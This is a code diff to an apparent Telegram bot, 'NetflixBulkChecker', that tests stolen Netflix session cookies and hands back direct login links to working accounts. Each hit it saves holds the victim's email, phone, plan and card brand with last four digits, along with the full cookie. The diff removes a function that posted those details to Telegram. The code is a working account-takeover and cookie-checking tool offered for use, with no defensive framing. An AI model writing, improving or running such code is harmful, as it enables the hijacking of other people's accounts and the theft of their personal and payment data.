@@ -142,27 +142,11 @@ class NetflixBulkChecker:
                     f.write("--- FULL COOKIE ---\n")
                     f.write(result['cookie'])
 
-                self.send_hit_to_telegram(result)
-                print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved{Style.RESET_ALL}")
+                # NO Telegram message for hits
+                print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved → {fname}{Style.RESET_ALL}")
 
             else:
                 self.stats['bad'] += 1
-
-    def send_hit_to_telegram(self, result):
-        flag = self.get_country_flag(result.get('country_code', 'XX'))
-        msg = f"""
-🔥 <b>NETFLIX PREMIUM HIT #{self.stats['hits']}</b> 🔥
-
-👤 <b>Email:</b> <code>{result.get('email')}</code>
-🌍 <b>Country:</b> {result.get('country_code')} {flag}
-📋 <b>Plan:</b> {result.get('plan')}
-📅 <b>Next Billing:</b> {result.get('next_billing')}
-📞 <b>Phone:</b> {result.get('phone')}
-💳 <b>Card:</b> {result.get('card_brand')} •••• {result.get('last4')}
-👥 <b>Profiles:</b> {result.get('profiles')}
-💾 <b>Saved in hits folder</b>
-"""
-        self.send_telegram(msg)
 
     def start(self, folder):
         files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
@@ -181,7 +165,7 @@ class NetflixBulkChecker:
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "📤 Send **ZIP**, **single .txt file**, or paste **cookie** directly.")
+    bot.reply_to(message, "📤 Send **ZIP**, **single .txt file**, or paste cookie directly.")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
@@ -248,7 +232,7 @@ def handle_direct_cookie(message):
         result = checker.check_cookie(text, "direct_chat")
 
         if result and result.get('login_url'):
-            bot.reply_to(message, f"✅ **Direct Login Link Ready**\n\n{result['login_url']}")
+            bot.reply_to(message, f"✅ **Direct Login Link**\n\n{result['login_url']}")
             
             os.makedirs('hits', exist_ok=True)
             fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
@@ -264,7 +248,6 @@ def handle_direct_cookie(message):
                 f.write("--- FULL COOKIE ---\n")
                 f.write(result['cookie'])
 
-            checker.send_hit_to_telegram(result)
         else:
             bot.reply_to(message, "❌ Invalid or Dead Cookie")
 
